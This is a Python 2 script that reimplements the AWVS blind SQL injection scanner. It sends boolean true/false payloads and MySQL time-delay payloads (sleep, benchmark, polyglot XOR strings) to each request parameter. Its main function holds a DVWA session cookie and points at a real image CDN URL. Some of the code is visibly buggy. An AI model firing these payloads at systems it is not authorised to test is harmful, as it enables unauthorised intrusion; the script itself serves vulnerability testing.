#!/usr/bin/env python
# coding=utf-8

"""
this script aim to rewrite the awvs blind sql injection script,
data: 18-04-23
author: jxy
"""

import sys
import random
import json
import math
import re
from lib.common import *
from colorama import *

reload(sys)
sys.setdefaultencoding('utf-8')
"""
testInjectionWithOR还有点问题
"""

# logger  = LogUtil()

class SQLInjectionTime(object):
    def __init__(self, url, headers, data=None):
        self.method = 'POST' if data else 'GET' # method
        self.data = data # post data
        self.isjson = is_json(data)  # is json format
        if isinstance(url, TURL):
            self.url = url
        else:
            self.url = TURL(url)

        self.headers = headers
        if self.method == 'GET':
            self.orivalue = self.url.get_dict_query.copy()
        else:
            # if post data
            if self.isjson:
                self.orivalue = json.loads(self.data)
            else:
                self.orivalue = dict(urlparse.parse_qsl(self.data))
        # dict value keys
        # if self.orivalue == {}:
        #     return
        self.orivalue_keys = self.orivalue.keys()
        # map the param key to 1,2,3
        self.variations = dict(zip(xrange(len(self.orivalue_keys)), self.orivalue_keys))

        if self.isjson:
            self.headers['Content-Type'] = 'application/json'
        self.hj = THTTPJOB(url, method=self.method, headers=self.headers, data=self.data, is_json=self.isjson)

        # init the shortDuration and longDuration
        self.shortDuration = 2
        self.longDuration = 6

        logger.info('URL: {}'.format(self.url))
        logger.info('OrigValue: {}'.format(self.orivalue))



    def checkIfResponseIsStable(self, varIndex):
        # test if the response is time statble
        time1 = 0
        time2 = 0
        body1 = ""
        body2 = ""
        status_code, headers, html, time_used = self.hj.request()
        self.origBody = body1
        if status_code == -1:
            return False
        if self.hj.ConnectionErrorCount > 0:
            return False
        param_value = self.orivalue[self.variations[varIndex]]
        body1 = self.filter_body(html, param_value)
        time1 = time_used

        # 第二次请求原始值
        status_code, headers, html, time_used = self.hj.request()
        if status_code == -1:
            return False
        if self.hj.ConnectionErrorCount > 0:
            return False
        body2 = self.filter_body(html, param_value)
        time2 = time_used

        # 通过判断响应时间来看是否稳定
        min_time = min(time1, time2)
        max_time = max(time1, time2)
        self.shortDuration = max(self.shortDuration, max_time) + 1
        self.longDuration = self.shortDuration * 2

        # 判断响应时间稳定的条件
        if(max_time - min_time > self.shortDuration): self.responseTimeIsStable = False
        else: self.responseTimeIsStable = True


        # 判断响应内容
        if(body2 != body1):
            logger.debug("len(body1)={} and len(body2)={}".format(len(body1), len(body2)))
            self.responseIsStable =False
            return True
        else:
            self.responseIsStable = True

        # 检测返回是否为空
        if (len(body1) == 0):
            self.inputIsStable = False
            return True

        # 如果inputIsStable和responseIsStable 为True, 发送一个随机串
        new_value = random_str()
        new_param_dict = self.orivalue.copy()
        new_param_dict[self.variations[varIndex]] = new_value
        if self.method == 'GET':
            self.hj.url.get_dict_query = new_param_dict
        else:
            if self.isjson:
                self.hj.data = json.dumps(new_param_dict)
            else:
                self.hj.data = (new_param_dict)
        status_code, headers, html, time_used = self.hj.request()
        # 恢复原来的参数值
        self.hj.request_param_dict = self.orivalue
        if status_code == -1:
            return False
        if self.hj.ConnectionErrorCount > 0:
            return False
        body3 = self.filter_body(html, param_value)
        # 判断响应是否稳定的
        if (body1 == body2 and body1 != body3):
            self.inputIsStable = True
        else:
            self.inputIsStable = False

        return True

    def filter_body(self, body, param_value):
        # filter the variable in body
        # awvs 还有一个extractTextFromBody, 暂时先不写， 推测可能是从标签中获取text，可以用beautifulSoup来实现

        # 过滤掉时间
        body = re.sub(r'([0-1]?[0-9]|[2][0-3]):([0-5][0-9])[.|:]([0-9][0-9])', '', body)
        body = re.sub(r'time\s*[:]\s*\d+\.?\d*', '', body)
        # 过滤掉
        # param_value = self.orivalue[self.variations[varIndex]]
        if len(str(param_value)) > 4:
            body.replace(param_value, '')

        return body

    def testInjection(self, varIndex, quoteChar, likeInjection):
        confirmed = False
        confirmResult = False
        while True:
            confirmResult = self.confirmInjection(varIndex, quoteChar, likeInjection, confirmed)
            logger.info("confirmResult={}".format(confirmResult))

            if (not confirmResult):
                # print "!!!!!!!!!!!!!!!!!!!!!!!!!"
                return False

            if confirmed:
                break
            else:
                confirmed = True
        return True


    def testInjectionWithOR(self, varIndex, quoteChar, dontCommentRestOfQuery):
        # 如果响应不稳定， 可以过or来做测试
        confirmed = False
        confirmResult = False
        while True:
            confirmResult = self.confirmInjectionWithOR(varIndex, quoteChar, confirmed, dontCommentRestOfQuery)
            logger.info("confirmResult={}".format(confirmResult))

            if (not confirmResult):
                print "!!!!!!!!!!!!!!!!!!!!!!!!!"
                return False

            if confirmed:
                break
            else:
                confirmed = True
        return True

    def confirmInjection(self, varIndex, quoteChar, likeInjection, confirmed):
        # awvs confirm injection rewrite
        origValue = self.orivalue.copy()
        # origValue
        # 原始响应
        origBody = self.origBody

        # 测试的响应
        testBody = ""
        paramValue = ""

        # 暂时不知道如何使用
        self.confirmInjectionHistory = False
        randNum = 10 + int(math.floor(random.random() * 989))
        randStr = random_str(length=4)

        if (confirmed): randStr = '0000' + randStr
        # numberic
        # if (num):
        #   randStr = randNum

        equalitySign = "="
        likeStr = ""

        if (likeInjection):
            likeStr = '%'
            equalitySign = '!='

        # 先不管数字型的，只看字符
        payload1 = likeStr + quoteChar + " AND 2*3*8=6*8 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr + likeStr
        # 生成payload
        logger.info("payload1= {}".format(payload1))
        paramValue = self.get_request_payload(origValue, varIndex, payload1)
        logger.debug("paramValue= {}".format(paramValue))
        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, urllib.urlencode(paramValue))
        if testBody != origBody:
            return False

        # add to confirmInjectionHistory

        # 测试假值
        payload2 = likeStr + quoteChar + " AND 2*3*8=6*9 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr + likeStr
        logger.info("payload2= {}".format(payload2))
        paramValue = self.get_request_payload(origValue, varIndex, payload2)

        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, urllib.urlencode(paramValue))
        if testBody == origBody:
            return False

        # add to confirmInjectionHistory
        # 再测一个假值
        payload3 = likeStr + quoteChar + " AND 3*3<(2*4) AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr + likeStr
        logger.info("payload3= {}".format(payload3))
        paramValue = self.get_request_payload(origValue, varIndex, payload3)
        logger.debug("paramValue= {}".format(paramValue))
        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, urllib.urlencode(paramValue))
        if testBody == origBody:
            return False

        # add to confirmInjectionHistory
        payload4 = likeStr + quoteChar + " AND 3*2>(1*5) AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr + likeStr
        logger.info("payload4= {}".format(payload4))
        paramValue = self.get_request_payload(origValue, varIndex, payload4)

        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, urllib.urlencode(paramValue))
        if testBody != origBody:
            return False
        # and to conrimInjecitionHistory

        # 测试真值
        payload5 = likeStr + quoteChar + " AND 3*2*0>=0 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr + likeStr
        logger.info("payload5= {}".format(payload5))
        paramValue = self.get_request_payload(origValue, varIndex, payload5)

        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, urllib.urlencode(paramValue))
        if testBody != origBody:
            return False
        # and to conrimInjecitionHistory

        # 然后再测假值
        payload6 = likeStr + quoteChar + " AND 3*3*9<(2*4) AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr + likeStr
        logger.info("payload6= {}".format(payload6))
        paramValue = self.get_request_payload(origValue, varIndex, payload6)

        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, urllib.urlencode(paramValue))
        if testBody == origBody:
            return False
        # and to conrimInjecitionHistory


        # do some common test
        # common test 真值
        payload7 = likeStr + quoteChar + " AND 5*4=20 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr + likeStr
        logger.info("payload7= {}".format(payload7))
        paramValue = self.get_request_payload(origValue, varIndex, payload7)

        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, urllib.urlencode(paramValue))
        if testBody != origBody:
            return False
        # add to confirmInjectionHistory

        # common test 假值
        payload8 = likeStr + quoteChar + " AND 5*4=21 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr + likeStr
        logger.info("payload8= {}".format(payload8))
        paramValue = self.get_request_payload(origValue, varIndex, payload8)

        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, urllib.urlencode(paramValue))
        if testBody == origBody:
            return False
        # and to conrimInjecitionHistory

        # 假值
        payload9 = likeStr + quoteChar + " AND 5*6<26 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr + likeStr
        logger.info("payload9= {}".format(payload9))
        paramValue = self.get_request_payload(origValue, varIndex, payload9)

        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, urllib.urlencode(paramValue))
        if testBody == origBody:
            return False
        # and to conrimInjecitionHistory

        # 真值
        payload10 = likeStr + quoteChar + " AND 7*7>48 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr + likeStr
        logger.info("payload10= {}".format(payload10))
        paramValue = self.get_request_payload(origValue, varIndex, payload10)

        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, urllib.urlencode(paramValue))
        if testBody != origBody:
            return False

        # 假值
        payload11 = likeStr + quoteChar + " AND 3*2*0=6 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr + likeStr
        logger.info("payload11= {}".format(payload11))
        paramValue = self.get_request_payload(origValue, varIndex, payload11)

        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, urllib.urlencode(paramValue))
        if testBody == origBody:
            return False
        # and to conrimInjecitionHistory

        # 真值
        payload12 = likeStr + quoteChar + " AND 3*2*1=6 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr + likeStr
        logger.info("payload12= {}".format(payload12))
        paramValue = self.get_request_payload(origValue, varIndex, payload12)

        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, urllib.urlencode(paramValue))
        if testBody != origBody:
            return False

        # logger.info("test if here")
        return paramValue

    def get_request_payload(self, origValue, varIndex, payload, initvalue=False):
        if isinstance(payload, list):
            pass
        else:
            payload = [payload,]

        tmpOrigValue = origValue.copy()
        # logger.info("tmpOrigValue={}".format(repr(tmpOrigValue)))
        # logger.info("self.variations={}".format(repr(self.variations)))
        tmpQueryKey = self.variations[varIndex]
        # logger.info("tmpQueryKey={}".format(tmpQueryKey))
        if initvalue:
            tmpOrigValue = {tmpQueryKey: '-1'}
        else:
            tmpQueryDict = {tmpQueryKey: tmpOrigValue.pop(tmpQueryKey)}
        # logger.info("temQueryDict={}".format(repr(tmpQueryDict)))
        # logger.info("tmpOrigValue={}".format(repr(tmpOrigValue)))
        tmpQueryStr = urllib.urlencode(tmpQueryDict)
        payload1 = Pollution(tmpQueryStr, payload).payload_generate()
        # logger.info("payload1={}".format(repr(payload1)))
        # print payload1[0]
        # print tmpOrigValue
        # print payload1[0].update(tmpOrigValue)
        payload = payload1[0]
        payload.update(tmpOrigValue)
        # logger.info("payload={}".format(payload))
        return payload


    def confirmInjectionWithOR(self, varIndex, quoteChar, confirmed, dontCommentRestOfQuery):
        # 将所有值设置为-1
        # awvs confirm injection rewrite
        origValue = self.orivalue.copy()
        # origValue
        origValue[self.variations[varIndex]] = "-1"
        # 原始响应
        origBody = self.origBody

        # 测试的响应
        testBody = ""
        paramValue = ""

        # 暂时不知道如何使用
        self.confirmInjectionHistory = False
        randNum = 10 + int(math.floor(random.random() * 989))
        randNum = str(randNum)
        randStr = randNum

        if (confirmed): randStr = '0000' + randStr
        # numberic
        # if (num):
        #   randStr = randNum

        equalitySign = "="

        # test TRUE
        payload1 = quoteChar + " OR 2+" + randNum + "-" + randNum + "-1=0+0+0+1 -- "
        if dontCommentRestOfQuery:
            payload1 = payload1[:-4]

        paramValue = self.get_request_payload(origValue, varIndex, payload1)
        logger.debug("paramValue1= {}".format(paramValue))
        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, urllib.urlencode(paramValue))
        if testBody == origBody:
            return False
        # add to confirm InjectionHistory

        # 保存上一次的TRUE值返回体
        trueBody = testBody

        # test False
        payload2 = quoteChar + " OR 3+" + randNum + "-" + randNum + "-1=0+0+0+1 -- "
        if dontCommentRestOfQuery:
            payload1 = payload2[:-4]

        paramValue = self.get_request_payload(origValue, varIndex, payload2)
        logger.debug("paramValue= {}".format(paramValue))
        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, urllib.urlencode(paramValue))
        if testBody == trueBody:
            return False
        # add  to confirmInjectionHistory

        # test False
        payload3 = quoteChar + " OR 3*2<(0+5+" + randNum + "-" + randNum + ") -- "
        if dontCommentRestOfQuery:
            payload1 = payload3[:-4]

        paramValue = self.get_request_payload(origValue, varIndex, payload3)
        logger.debug("paramValue= {}".format(paramValue))
        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, urllib.urlencode(paramValue))
        if testBody == trueBody:
            return False

        # test True
        payload4 =  quoteChar + " OR 3*2>(0+5+" + randNum + "-" + randNum + ") -- "
        if dontCommentRestOfQuery:
            payload1 = payload4[:-4]

        paramValue = self.get_request_payload(origValue, varIndex, payload4)
        logger.debug("paramValue= {}".format(paramValue))
        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, urllib.urlencode(paramValue))
        if testBody != trueBody:
            return False

        # test True,  混用更复杂的测试
        payload5 = quoteChar + " OR 2+1-1-1=1 AND " + randStr + "=" + randStr + " -- "
        if dontCommentRestOfQuery:
            payload1 = payload5[:-4]

        paramValue = self.get_request_payload(origValue, varIndex, payload5)
        logger.debug("paramValue= {}".format(paramValue))
        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, urllib.urlencode(paramValue))
        if testBody != trueBody:
            return False


        # test False
        payload6 = quoteChar + " OR " + randStr + "=" + randStr + " AND 3+1-1-1=1 -- "
        if dontCommentRestOfQuery:
            payload1 = payload6[:-4]

        paramValue = self.get_request_payload(origValue, varIndex, payload6)
        logger.debug("paramValue= {}".format(paramValue))
        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, urllib.urlencode(paramValue))
        if testBody == trueBody:
            return False

        # test False
        payload7 = quoteChar + " OR 3*2=5 AND " + randStr + "=" + randStr + " -- "
        if dontCommentRestOfQuery:
            payload1 = payload7[:-4]

        paramValue = self.get_request_payload(origValue, varIndex, payload7)
        logger.debug("paramValue= {}".format(paramValue))
        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, urllib.urlencode(paramValue))
        if testBody == trueBody:
            return False

        # test True
        payload8 = quoteChar + " OR 3*2=6 AND " + randStr + "=" + randStr + " -- "
        if dontCommentRestOfQuery:
            payload1 = payload8[:-4]

        paramValue = self.get_request_payload(origValue, varIndex, payload8)
        logger.debug("paramValue= {}".format(paramValue))
        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, urllib.urlencode(paramValue))
        if testBody != trueBody:
            return False

        # test False
        payload9 = quoteChar + " OR 3*2*0=6 AND " + randStr + "=" + randStr + " -- "
        if dontCommentRestOfQuery:
            payload1 = payload9[:-4]

        paramValue = self.get_request_payload(origValue, varIndex, payload9)
        logger.debug("paramValue= {}".format(paramValue))
        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, urllib.urlencode(paramValue))
        if testBody == trueBody:
            return False

        # test True
        payload10 = quoteChar + " OR 3*2*1=6 AND " + randStr + "=" + randStr + " -- "
        if dontCommentRestOfQuery:
            payload1 = payload10[:-4]

        paramValue = self.get_request_payload(origValue, varIndex, payload10)
        logger.debug("paramValue= {}".format(paramValue))
        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, urllib.urlencode(paramValue))
        if testBody != trueBody:
            return False

        return paramValue


    def genSleepString(self, sleepType):
        if (sleepType == 'long'):
            return str(self.longDuration)
        elif sleepType == 'verylong':
            return str(int(self.shortDuration) + int(self.longDuration))
        elif sleepType == 'mid':
            return str(self.shortDuration)
        elif sleepType == '2xmid':
            return str(2 * int(self.shortDuration) + 1)
        elif sleepType  == 'none':
            return "0"

    def testTiming(self, varIndex, paramValue, dontEncode, benchmark=False):
        # origParamValue = paramValue
        timeOrigValueDict = self.orivalue.copy()
        tmp_origvalue = timeOrigValueDict[self.variations[varIndex]]
        timeOrigValueDict[self.variations[varIndex]] += paramValue
        origParamValue = urllib.unquote(urllib.urlencode(timeOrigValueDict))

        logger.info(Fore.RED + "origParamValue= {}".format(origParamValue) + Style.RESET_ALL)
        confirmed = False
        # 生成四个时间变量
        time1 = 0 # long  4
        time2 = 0 # no    0
        time3 = 0 # mid   3
        time4 = 0 # very long 6

        timeOutSec = 20
        zeroTimeOut = self.shortDuration - 1
        if (zeroTimeOut > 3): zeroTimeOut = 3

        timeOutCounter = 0

        def stepLongDelay():
            if not benchmark:
                paramValue = origParamValue.replace('{SLEEP}', self.genSleepString('long'))
            else:
                paramValue = origParamValue.replace('{BSLEEP}', '4000000')
            # 这里可能有点问题，一会再改
            paramValue = paramValue.replace('{ORIGVALUE}', tmp_origvalue)
            paramValue = paramValue.replace('{RANDSTR}', random_str())
            # 这里paramValue应该是a=b&c=d这种形式的，
            paramValue_dict = Url.qs_parse(paramValue)

            print ""
            self.hj.request_param_dict = paramValue_dict
            status_code, headers, html, time_used = self.hj.request()
            logger.info("time_usd={} & sleep={}".format(time_used, self.genSleepString('long')))
            if self.hj.ConnectionErrorCount > 0:
                return False

            time1 = time_used
            if time1 < (int(self.longDuration) * 99 /100): return False
            return time1

        def stepZeroDelay():
            if not benchmark:
                paramValue = origParamValue.replace('{SLEEP}', self.genSleepString('none'))
            else:
                paramValue = origParamValue.replace('{BSLEEP}', '1')
            # 这里可能有点问题，一会再改
            paramValue = paramValue.replace('{ORIGVALUE}', tmp_origvalue)
            paramValue = paramValue.replace('{RANDSTR}', random_str())
            # 这里paramValue应该是a=b&c=d这种形式的，
            paramValue_dict = Url.qs_parse(paramValue)

            self.hj.request_param_dict = paramValue_dict
            status_code, headers, html, time_used = self.hj.request()
            logger.info("time_usd={} & sleep={}".format(time_used, self.genSleepString('none')))
            if self.hj.ConnectionErrorCount > 0:
                timeOutCounter += 1

            time2 = time_used
            if time2 > zeroTimeOut: return False

            return time2

        def stepMidDelay():
            if not benchmark:
                paramValue = origParamValue.replace('{SLEEP}', self.genSleepString('mid'))
            else:
                paramValue = origParamValue.replace('{BSLEEP}', '1000000')
            # 这里可能有点问题，一会再改
            paramValue = paramValue.replace('{ORIGVALUE}', tmp_origvalue)
            paramValue = paramValue.replace('{RANDSTR}', random_str())
            # 这里paramValue应该是a=b&c=d这种形式的，
            paramValue_dict = Url.qs_parse(paramValue)

            self.hj.request_param_dict = paramValue_dict
            status_code, headers, html, time_used = self.hj.request()
            logger.info("time_usd={} & sleep={}".format(time_used, self.genSleepString('mid')))
            if self.hj.ConnectionErrorCount > 0:
                return False

            time3 = time_used
            if (time3 < int(self.shortDuration) * 99 /100): return False

            return time3

        def stepVeryLongDelay():
            veryLongDuration = int(self.shortDuration) + int(self.longDuration)
            if not benchmark:
                paramValue = origParamValue.replace('{SLEEP}', self.genSleepString('verylong'))
            else:
                paramValue = origParamValue.replace('{BSLEEP}', '5000000')
            # 这里可能有点问题，一会再改
            paramValue = paramValue.replace('{ORIGVALUE}', tmp_origvalue)
            paramValue = paramValue.replace('{RANDSTR}', random_str())
            # 这里paramValue应该是a=b&c=d这种形式的，
            paramValue_dict = Url.qs_parse(paramValue)

            self.hj.request_param_dict = paramValue_dict
            status_code, headers, html, time_used = self.hj.request()
            logger.info("time_usd={} & sleep={}".format(time_used, self.genSleepString('verylong')))
            if self.hj.ConnectionErrorCount > 0:
                return False

            time4 = time_used
            if (time4 < veryLongDuration * 99 /100): return False

            return time4

        permutations = ("lzvm", "lzmv", "lvzm", "lvmz", "lmzv", "lmvz", "vzlm", "vzml", "vlzm", "vlmz", "vmzl", "vmlz", "mzlv", "mzvl", "mlzv", "mlvz", "mvzl", "mvlz")
        permIndex = random.randint(0, len(permutations)-1)

        permutation = permutations[permIndex] + 'zzzlz'
        for i in permutation:
            if i == 'z':
                time2 = stepZeroDelay()
                if time2 is False:
                    return False

            elif i == 'l':
                time1 = stepLongDelay()
                if time1 is False:
                    return False
            elif i == 'v':
                time4 = stepVeryLongDelay()
                if time4 is False:
                    return False
            elif i == 'm':
                time3 = stepMidDelay()
                if time3 is False:
                    return False

        logger.info("\ntime1={}\ntime2={}\ntime3={}\ntime4={}".format(time1,time2,time3,time4))
        # 在上边都完成之后
        if (time3 >= time4  or time3 > time1 or time2 > time4 or time2 > time1):
            return False

        if (time3 >= time1):
            return False

        if (time1 >= time4):
            return False

        if timeOutCounter > 0:
            return False

        return True



    def testTimingStartPoint(self, varIndex):
        prefix = ['', '\'', '"', '\')', '")']
        for quoteChar in prefix:
            payload = quoteChar + " or if(now()=sysdate(),sleep({SLEEP}),0)/*'XOR(if(now()=sysdate(),sleep({SLEEP}),0))OR'\"XOR(if(now()=sysdate(),sleep({SLEEP}),0))OR\"*/" + " or " + quoteChar
            logger.info(Fore.RED + "pyaload={}".format(payload) + Style.RESET_ALL)
            time_result = self.testTiming(varIndex, payload, True, benchmark=False)
            if time_result:
                logger.info(Fore.RED + "Found Time Injection At URL={}".format(self.url) + Style.RESET_ALL)
                return True
        # send payload
        for quoteChar in prefix:
            payload = quoteChar + " or (select(0)from(select(sleep({SLEEP})))v)/*'+(select(0)from(select(sleep({SLEEP})))v)+'\"+(select(0)from(select(sleep({SLEEP})))v)+\"*/" + " or " + quoteChar
            time_result = self.testTiming(varIndex, payload, True, benchmark=False)
            if time_result:
                logger.info(Fore.RED + "Found Time Injection At URL={}".format(self.url) + Style.RESET_ALL)
                return True
        # awvs original payload like this
        payload = "if(now()=sysdate(),sleep({SLEEP}),0)/*'XOR(if(now()=sysdate(),sleep({SLEEP}),0))OR'\"XOR(if(now()=sysdate(),sleep({SLEEP}),0))OR\"*/"

        time_result = self.testTiming(varIndex, payload, True, benchmark=False)
        if time_result:
            logger.info(Fore.RED + "Found Time Injection At URL={}".format(self.url) + Style.RESET_ALL)
            return True

        payload2 = "(select(0)from(select(sleep({SLEEP})))v)/*'+(select(0)from(select(sleep({SLEEP})))v)+'\"+(select(0)from(select(sleep({SLEEP})))v)+\"*/"
        time_result = self.testTiming(varIndex, payload2, True, benchmark=False)
        if time_result:
            logger.info(Fore.RED + "Found Time Injection At URL={}".format(self.url) + Style.RESET_ALL)
            return True

        return False
        # benchmark loser


    def testBoolStartPoint(self, varIndex):
        prefix = ['', '\'', '"', '\')', '")']
        for quoteChar in prefix:
            time_result = self.testInjection(varIndex, quoteChar, False)
            if time_result:
                logger.info(Fore.RED + "Found Bool Injection At URL={}".format(self.url) + Style.RESET_ALL)
                return True

        for quoteChar in prefix:
            time_result = self.testInjectionWithOR(varIndex, quoteChar, False)
            if time_result:
                logger.info(Fore.RED + "Found Bool/With OR Injection At URL={}".format(self.url) + Style.RESET_ALL)
                return True

        return False

    def startTest(self):
        try:
            for varIndex in self.variations:
                if self.checkIfResponseIsStable(varIndex):
                    logger.info("[startTest] Response Is Stable")
                else:
                    logger.info("[startTest] Response Is Not Stable")

                r = self.testTimingStartPoint(varIndex)
                if r:
                    # here shoud be return a format result
                    return True

                r = self.testBoolStartPoint(varIndex)
                if r:
                    return True

            return False
        except Exception as e:
            logger.error("error happend, reason is :{}, URL: {}".format(repr(e), self.url))
            # r = self.testInjectionWithOR(varIndex)

def main():
    headers = {
        "Cookie": 'security=low; PHPSESSID=qn7uogv579nbifqopr1hf53k36',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36',
        'Referer': 'http://10.127.21.237/dvwa/vulnerabilities/sqli_blind/'
    }
    url = 'http://img12.360buyimg.com/n2/jfs/t3229/314/6863934982/144141/86bc1245/58aeb140Nde581af9.jpg!q90'
    a = SQLInjectionTime(url, headers)
    r = a.startTest()
    if r:
        print "o fuck"
    # for i in a.variations:
    #     print i
    #     if a.checkIfResponseIsStable(i):
    #         logger.info("stable")
    #     else:
    #         logger.info('unstable')
    #     test = a.testInjection(i, "'", False)
    #     logger.info("test={}".format(test))
    #     if test:
    #         logger.info("found")
    #         # return
    #     else:
    #         logger.info("fuck")

    #     test = a.testInjectionWithOR(i, "'", False)
    #     if test:
    #         logger.info("with or found")
    #         # return
    #     else:
    #         logger.info("with or fucked")

    #     time_payload1 = "'" + " or if(now()=sysdate(),sleep({SLEEP}),0)/*'XOR(if(now()=sysdate(),sleep({SLEEP}),0))OR'\"XOR(if(now()=sysdate(),sleep({SLEEP}),0))OR\"*/" + " or " + "'"
    #     test = a.testTiming(i, time_payload1, True, benchmark=False)
    #     if test:
    #         logger.info("time success")
    #         # return
    #     else:
    #         logger.info("time fucked")

    #     time_payload2 = "'" + " or if(now()=sysdate(),(select(0)from(select(benchmark({BSLEEP},MD5(1))))v),0)/*'XOR(if(now()=sysdate(),(select(0)from(select(benchmark({BSLEEP},MD5(1))))v),0))OR'\"XOR(if(now()=sysdate(),(select(0)from(select(benchmark({BSLEEP},MD5(1))))v),0))OR\"*/" + " or " + "'"
    #     test = a.testTiming(i, time_payload2, True, benchmark=True)
    #     if test:
    #         logger.info("benchmark success")
    #     else:
    #         logger.info("benchmark fucked")

if __name__ == '__main__':
    main()
